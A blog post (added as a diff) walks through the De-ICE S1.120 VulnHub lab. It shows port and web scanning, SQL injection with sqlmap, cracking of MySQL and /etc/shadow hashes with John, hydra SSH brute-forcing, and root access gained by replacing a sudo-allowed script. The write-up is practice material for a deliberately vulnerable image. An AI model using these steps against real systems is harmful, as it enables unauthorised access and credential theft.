@@ -1,0 +1,375 @@
+---
+layout: post
+title: "DE-ICE-S1.120"
+date: 2015-05-13 15:54:08 +0200
+comments: true
+categories: [vulnhub, deice]
+---
+Image: [De-ICE: S1.120](https://www.vulnhub.com/entry/de-ice-s1120,10/)
+
+Nmap output:
+{% codeblock %}
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      ProFTPD 1.3.2
+22/tcp   open  ssh      OpenSSH 5.1 (protocol 2.0)
+80/tcp   open  http     Apache httpd 2.2.11 ((Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0)
+443/tcp  open  ssl/http Apache httpd 2.2.11 ((Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0)
+3306/tcp open  mysql    MySQL (unauthorized)
+MAC Address: 00:0C:29:53:2F:A3 (VMware)
+Service Info: OS: Unix
+{% endcodeblock %}
+
+Nikto output:
+{% codeblock %}
+root@kali32:~# nikto -h 192.168.1.120
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.120
++ Target Hostname:    192.168.1.120
++ Target Port:        80
++ Start Time:         2015-05-07 00:29:50 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.11 (Unix) DAV/2 mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0
++ Retrieved x-powered-by header: PHP/5.2.9
++ The anti-clickjacking X-Frame-Options header is not present.
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var, HTTP_NOT_FOUND.html.var
++ Server leaks inodes via ETags, header found with file /favicon.ico, inode: 8430, size: 30894, mtime: Fri May 11 14:40:36 2007
++ mod_apreq2-20051231/2.6.0 appears to be outdated (current is at least 2.6.1)
++ mod_perl/2.0.4 appears to be outdated (current is at least 2.0.7)
++ Apache/2.2.11 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
++ mod_ssl/2.2.11 appears to be outdated (current is at least 2.8.31) (may depend on server version)
++ PHP/5.2.9 appears to be outdated (current is at least 5.4.26)
++ Perl/v5.10.0 appears to be outdated (current is at least v5.14.2)
++ OpenSSL/0.9.8k appears to be outdated (current is at least 1.0.1e). OpenSSL 0.9.8r is also current.
++ mod_ssl/2.2.11 OpenSSL/0.9.8k PHP/5.2.9 mod_apreq2-20051231/2.6.0 mod_perl/2.0.4 Perl/v5.10.0 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-3268: /webalizer/: Directory indexing found.
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ OSVDB-3233: /cgi-bin/printenv: Apache 2.0 default script is executable and gives server environment variables. All default scripts should be removed. It may also allow XSS types of attacks. http://www.securityfocus.com/bid/4431.
++ OSVDB-3233: /cgi-bin/test-cgi: Apache 2.0 default script is executable and reveals system information. All default scripts should be removed.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /phpmyadmin/: phpMyAdmin directory found
++ 7354 requests: 0 error(s) and 25 item(s) reported on remote host
++ End Time:           2015-05-07 00:30:03 (GMT2) (13 seconds)
+---------------------------------------------------------------------------
+{% endcodeblock %}
+
+As we can see, Nikto reveals the installation of phpmyadmin and some minor
+vulnerabilities. There is an information about CVE-2002-0082 too, but we didn't
+find any exploit for the issue.
+
+We connect to the web page, add a few products and try sql injection:
+{% codeblock %}
+http://192.168.1.120/products.php?id=2 or 1=1--+
+{% endcodeblock %}
+
+We found out that it works so we try sqlmap to dump the whole database content:
+{% codeblock %}
+root@kali32:~# sqlmap -u "http://192.168.1.120/products.php?id=1" -p id --dump-all
+{% endcodeblock %}
+
+This gives us the mysql sha1 hashes. After a small formating, we got:
+{% codeblock %}
+root@kali32:~/.sqlmap/output/192.168.1.120/dump/mysql# cat user-f3649c95.csv | cut -d, -f2-3 | sed 's#,#:#' > hashes.csv
+root@kali32:~/.sqlmap/output/192.168.1.120/dump/mysql# john --format=mysql-sha1 hashes.csv
+Loaded 50 password hashes with no different salts (MySQL 4.1 double-SHA-1 [128/128 SSE2 intrinsics 8x])
+123456           (bwatkins)
+12345            (ktso)
+password         (krenfro)
+12345678         (amaynard)
+abc123           (cchisholm)
+computer         (jalvarez)
+1234             (dwestling)
+qwerty           (tdeleon)
+internet         (sgains)
+shadow           (jfranklin)
+baseball         (kwebber)
+letmein          (dstevens)
+dragon           (bbanter)
+jordan           (mbryan)
+michael          (aweiland)
+michelle         (hlovell)
+trustno1         (rpatel)
+soccer           (dgrant)
+batman           (aadams)
+football         (mholland)
+iloveyou         (rdominguez)
+jennifer         (mrodriguez)
+master           (strammel)
+monkey           (jbresnahan)
+pepper           (djohnson)
+sunshine         (ccoffee)
+whatever         (aheflin)
+welcome          (jalcantar)
+111111           (jayala)
+654321           (bphillips)
+666666           (aspears)
+killer           (dcooper)
+princess         (kclemons)
+superman         (aharp)
+123123           (tgoodchap)
+1234567          (aallen)
+cheese           (lmorales)
+starwars         (myajima)
+Password         (mnader)
+nintendo         (dgilfillan)
+pokemon          (rjacobson)
+passw0rd         (lmartinez)
+0                (dtraylor)
+consumer         (sjohnson)
+gawker           (jduff)
+kotaku           (swarren)
+babyl0n          (jdavenport)
+gizmodo          (qpowers)
+{% endcodeblock %}
+
+Trying to login through ssh:
+{% codeblock %}
+root@kali32:~/.sqlmap/output/192.168.1.120/dump/mysql# john --format=mysql-sha1 hashes.csv --show | grep : > ~/user-pass.list
+root@kali32:~# hydra -C user-pass.list 192.168.1.120 ssh
+{% endcodeblock %}
+
+We use one of the accounts to log in and check if there is any user with the higher privileges:
+{% codeblock %}
+rdominguez@slax:~$ cat /etc/group
+root:x:0:root
+bin:x:1:root,bin
+daemon:x:2:root,bin,daemon
+sys:x:3:root,bin,adm
+adm:x:4:root,adm,daemon
+tty:x:5:
+disk:x:6:root,adm
+lp:x:7:lp
+mem:x:8:
+kmem:x:9:
+wheel:x:10:root
+floppy:x:11:root
+mail:x:12:mail
+news:x:13:news
+uucp:x:14:uucp
+man:x:15:
+audio:x:17:root
+video:x:18:root
+cdrom:x:19:root
+games:x:20:
+slocate:x:21:
+utmp:x:22:
+smmsp:x:25:smmsp
+tape:x:26:root
+mysql:x:27:
+rpc:x:32:
+sshd:x:33:sshd
+gdm:x:42:
+shadow:x:43:
+ftp:x:50:
+apache:x:80:
+messagebus:x:81:
+haldaemon:x:82:
+plugdev:x:83:root
+power:x:84:
+pop:x:90:pop
+scanner:x:93:
+nobody:x:98:nobody
+nogroup:x:99:
+users:x:100:ccoffee
+console:x:101:
+admin:x:102:ccoffee
+{% endcodeblock %}
+
+Right, ccoffee is in admin group. For other users it is not allowed to use sudo.
+
+We check his competencies:
+{% codeblock %}
+root@kali32:~# ssh 192.168.1.120 -l ccoffee
+ccoffee@192.168.1.120's password:
+Linux 2.6.27.27.
+ccoffee@slax:~$ sudo -l
+User ccoffee may run the following commands on this host:
+    (root) NOPASSWD: /home/ccoffee/scripts/getlogs.sh
+{% endcodeblock %}
+
+There is a script in his home directory that he can execute, unfortunately we
+cannot read the content. Removing the script and creating a new one with the
+content 'sh' gives root:
+{% codeblock %}
+ccoffee@slax:~/scripts$ sudo ./getlogs.sh
+sh-3.1#
+
+sh-3.1# cat /etc/shadow
+root:$1$rxn0aycI$hsQIsFGccfDbCG5/1nfH91:16567:0:::::
+bin:*:9797:0:::::
+daemon:*:9797:0:::::
+adm:*:9797:0:::::
+lp:*:9797:0:::::
+sync:*:9797:0:::::
+shutdown:*:9797:0:::::
+halt:*:9797:0:::::
+mail:*:9797:0:::::
+news:*:9797:0:::::
+uucp:*:9797:0:::::
+operator:*:9797:0:::::
+games:*:9797:0:::::
+ftp:*:9797:0:::::
+smmsp:*:9797:0:::::
+mysql:*:9797:0:::::
+rpc:*:9797:0:::::
+sshd:*:9797:0:::::
+gdm:*:9797:0:::::
+pop:*:9797:0:::::
+apache:*:9797:0:::::
+messagebus:*:9797:0:::::
+haldaemon:*:9797:0:::::
+nobody:*:9797:0:::::
+myajima:$1$60c/cucI$5j0aMHbj4jNDRAYhb4m3K0:16567:0:99999:7:::
+lmartinez:$1$rMh/hucI$Pr6vOoriwdZPgphX0nSTa1:16567:0:99999:7:::
+mbryan:$1$.di/mucI$oOj2Jz4nBoVxTqDo1im.X0:16567:0:99999:7:::
+krenfro:$1$Hvj/rucI$Cg2UjwsziydtkBqypwdHp/:16567:0:99999:7:::
+dgilfillan:$1$V7l/wucI$cKtiNIUgy2TYFi5pxWCCH.:16567:0:99999:7:::
+jduff:$1$uJm//vcI$llf6cmzpyYX84rgky6lfK0:16567:0:99999:7:::
+amaynard:$1$QZn/4vcI$8QI5BxGxAMU/aCl7IJ1Nm1:16567:0:99999:7:::
+aallen:$1$kso/9vcI$woWfNYjoIWhvV6r5j7Xxa/:16567:0:99999:7:::
+aadams:$1$q5q/EvcI$yWIE/.cQu8APDgjY.5ABV/:16567:0:99999:7:::
+aard:$1$INr/JvcI$8S6mudd4gUth0CmMxh.Ab0:16567:0:99999:7:::
+rpatel:$1$scs/OvcI$8jSf3YcG9TpSU6yuI6q5G0:16567:0:99999:7:::
+qpowers:$1$7st/TvcI$7GqfQsXLy2v8CosCkCTNV1:16567:0:99999:7:::
+dstevens:$1$d4v/YvcI$dRWsGihSIwWOCOV1uIzzv.:16567:0:99999:7:::
+bphillips:$1$2Lw/dvcI$yr0cO6WTpKMPv89xi99Hi/:16567:0:99999:7:::
+aheflin:$1$mjx/ivcI$1hvn.7HlbUqLB2Vp.WRpn0:16567:0:99999:7:::
+mrodriguez:$1$80z/nvcI$W7S6KtvKXWiJAaDjU6Cbd/:16567:0:99999:7:::
+tgoodchap:$1$ER.0svcI$F6ZxBlWOy6pQUlhDC7.VD1:16567:0:99999:7:::
+djohnson:$1$Ej/0xvcI$8lRyGhMsdM8OUYA5qbDs1.:16567:0:99999:7:::
+mholland:$1$I5100wcI$9tJothOx.INRYNMF7016P/:16567:0:99999:7:::
+dtraylor:$1$OT205wcI$vlX3N7czGPvJGOCgOXDzA0:16567:0:99999:7:::
+bwatkins:$1$Um30AwcI$Xb333lgx4Mcx7PApUoQnN/:16567:0:99999:7:::
+rjacobson:$1$6650FwcI$yHSb8Kr7hUHyny3Y.mDXQ0:16567:0:99999:7:::
+jfranklin:$1$Ti60KwcI$nKUPLiDD67sl9lUTf3aJ90:16567:0:99999:7:::
+swarren:$1$2y70PwcI$DpY/2bG7k.DUI.E0i19Fh/:16567:0:99999:7:::
+mnader:$1$3K90UwcI$3vkAOSnLqK44jBF.kDVWE1:16567:0:99999:7:::
+strammel:$1$QmA0ZwcI$mp5SxAjrzs1nqjf6cxztK1:16567:0:99999:7:::
+rdominguez:$1$gIC0ewcI$7VCqMoXzYKW1vgzCaglJ6.:16567:0:99999:7:::
+jbresnahan:$1$qnD0jwcI$yg30Ub/pK3fcx9U50VP701:16567:0:99999:7:::
+cchisholm:$1$K7F0owcI$3WhfwvSnQzEfvVWjZnhm2/:16567:0:99999:7:::
+aspears:$1$/ZG0twcI$o1Yw0aAr86poWqk7.PZy3.:16567:0:99999:7:::
+dwestling:$1$QxH0ywcI$yXczKrqz56FctGhw3AKV41:16567:0:99999:7:::
+sjohnson:$1$1hJ01xcI$hRY/wfBlj3cYqCpPrdO1j.:16567:0:99999:7:::
+hlovell:$1$U9L06xcI$kj0vAVGLnx.9TcQr88ZoN0:16567:0:99999:7:::
+tdeleon:$1$UaM0BxcI$i9zo//F6m3IGEXWF4E4VU.:16567:0:99999:7:::
+ccoffee:$1$FDO0GxcI$1Gl5A67Slt0mhD7iiZaLr/:16567:0:99999:7:::
+jalvarez:$1$EbP0LxcI$pMZtEjdYdkrQRCuyw3zQ00:16567:0:99999:7:::
+jalcantar:$1$H4R0QxcI$HFlaU41TFGRu0LAC0Fv0g.:16567:0:99999:7:::
+sgains:$1$hiS0VxcI$FCEDYdN96OmIfnttnE6f21:16567:0:99999:7:::
+bbanter:$1$99U0axcI$TONdzMbnM4yotrbmBCTU7/:16567:0:99999:7:::
+lmorales:$1$WZV0fxcI$l5OZvem/JITin7SydRcoS.:16567:0:99999:7:::
+jayala:$1$5zW0kxcI$ghdAHJPWYrkNWLatUJwxe1:16567:0:99999:7:::
+kclemons:$1$lIY0pxcI$/4/W5o0NzWszs9aKQyZVt/:16567:0:99999:7:::
+aharp:$1$qdZ0uxcI$OdHV6pN42eG9DoYc.ToNo0:16567:0:99999:7:::
+kwebber:$1$.Eb0zxcI$sdvd7YNQIBUhTFGfBr./W/:16567:0:99999:7:::
+dgrant:$1$2cc02ycI$IL9nHFcDzbkDsj97kJk860:16567:0:99999:7:::
+jdavenport:$1$uJo0cycI$wH8zAEudh0JToiTfDFYwT/:16567:0:99999:7:::
+ktso:$1$/ff0CycI$2mPgNapzGACNxu0MXFs4P1:16567:0:99999:7:::
+aweiland:$1$TAh0HycI$pJtJ5xBl2AZc4nbKKBhR6.:16567:0:99999:7:::
+dcooper:$1$Egi0MycI$lxdN6qIIFOkCAPTHbk8Tu/:16567:0:99999:7:::
+{% endcodeblock %}
+
+We realized that the passwords are different when we reboot the server. Digging deeper, we find more clues:
+{% codeblock lang:bash %}
+root@slax:/mnt/live/memory/changes# cat ./etc/rc.d/rc.local
+..
+root@slax:/mnt/live# vim /mnt/hdc/slax/rootcopy/opt/lampp/htdocs/setup.sh
+..
+#Shuffle the users and passwords, create usernames, and match them up with passwords
+#The 50 passwords come from top 50 in Gawker media's password breach
+shuf -o /opt/lampp/htdocs/pass50.txt /opt/lampp/htdocs/pass50.txt
+shuf -o /opt/lampp/htdocs/users.txt /opt/lampp/htdocs/users.txt
+awk '/./ {print tolower(substr($1,1,1))tolower($2)}' /opt/lampp/htdocs/users.txt > /opt/lampp/htdocs/usernames.txt
+paste -d' ' /opt/lampp/htdocs/usernames.txt /opt/lampp/htdocs/pass50.txt /opt/lampp/htdocs/users.txt > /opt/lampp/htdocs/userpass.txt
+..
+
+#Set root OS password
+echo "root:I@47hdlT!@!" | chpasswd
+
+#Root password clue in jdavenport's home dir
+echo "I ate 47 hot dogs last Tuesday!@!" > /home/jdavenport/svrc.txt
+..
+
+#Vulnerable script placed in ccoffee's home dir with a hidden password
+echo "#!/bin/bash
+if [ \"\$2\" == \"emerald\" ]; then
+        while read line
+        do
+                echo \$line
+        done < \$1
+else
+        echo "wrong!"
+fi
+" > /home/ccoffee/scripts/getlogs.sh
+{% endcodeblock %}
+
+Finally with this information, we was able to successfully cracked the whole /etc/shadow:
+{% codeblock %}
+root@kali32:~# john hashes.john --show
+root:I@47hdlT!@!:16567:0:::::
+myajima:12345678:16567:0:99999:7:::
+lmartinez:computer:16567:0:99999:7:::
+mbryan:sunshine:16567:0:99999:7:::
+krenfro:master:16567:0:99999:7:::
+dgilfillan:1234:16567:0:99999:7:::
+jduff:welcome:16567:0:99999:7:::
+amaynard:iloveyou:16567:0:99999:7:::
+aallen:pepper:16567:0:99999:7:::
+aadams:trustno1:16567:0:99999:7:::
+aard:123123:16567:0:99999:7:::
+rpatel:password:16567:0:99999:7:::
+qpowers:lifehack:16567:0:99999:7:::
+dstevens:cheese:16567:0:99999:7:::
+bphillips:baseball:16567:0:99999:7:::
+aheflin:football:16567:0:99999:7:::
+mrodriguez:kotaku:16567:0:99999:7:::
+tgoodchap:killer:16567:0:99999:7:::
+djohnson:consumer:16567:0:99999:7:::
+mholland:0:16567:0:99999:7:::
+dtraylor:princess:16567:0:99999:7:::
+bwatkins:jordan:16567:0:99999:7:::
+rjacobson:654321:16567:0:99999:7:::
+jfranklin:qwerty:16567:0:99999:7:::
+swarren:Password:16567:0:99999:7:::
+mnader:michelle:16567:0:99999:7:::
+strammel:letmein:16567:0:99999:7:::
+rdominguez:shadow:16567:0:99999:7:::
+jbresnahan:soccer:16567:0:99999:7:::
+cchisholm:whatever:16567:0:99999:7:::
+aspears:111111:16567:0:99999:7:::
+dwestling:123456:16567:0:99999:7:::
+sjohnson:batman:16567:0:99999:7:::
+hlovell:michael:16567:0:99999:7:::
+tdeleon:gawker:16567:0:99999:7:::
+ccoffee:gizmodo:16567:0:99999:7:::
+jalvarez:blahblah:16567:0:99999:7:::
+jalcantar:nintendo:16567:0:99999:7:::
+sgains:dragon:16567:0:99999:7:::
+bbanter:12345:16567:0:99999:7:::
+lmorales:jennifer:16567:0:99999:7:::
+jayala:666666:16567:0:99999:7:::
+kclemons:monkey:16567:0:99999:7:::
+aharp:passw0rd:16567:0:99999:7:::
+kwebber:superman:16567:0:99999:7:::
+dgrant:internet:16567:0:99999:7:::
+jdavenport:babyl0n:16567:0:99999:7:::
+ktso:starwars:16567:0:99999:7:::
+aweiland:abc123:16567:0:99999:7:::
+dcooper:pokemon:16567:0:99999:7:::
+
+50 password hashes cracked, 0 left
+{% endcodeblock %}
+
+There is also a trace that the root user connected via ssh to another server with IP address 192.168.1.20:
+{% codeblock %}
+root@slax:~# cat .ssh/known_hosts
+192.168.1.20 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA3ViCbImH/GTN+b1DigEYLnrUSHk8J7ZEt6+IX1etXQx89VQXhKAh098dpoUIAlnYIIsCcvmqHSwbCY0JxwwoV7bHqfQB/y05hWv//hQ6hhOIJBJfTOuezAgMxEbZbfaEJf5U3ROhGd4TbdIrsaoPruQ9asG/ok6yrWfKBK6pcizIxL/Q+uvRlcC8X=
+{% endcodeblock %}
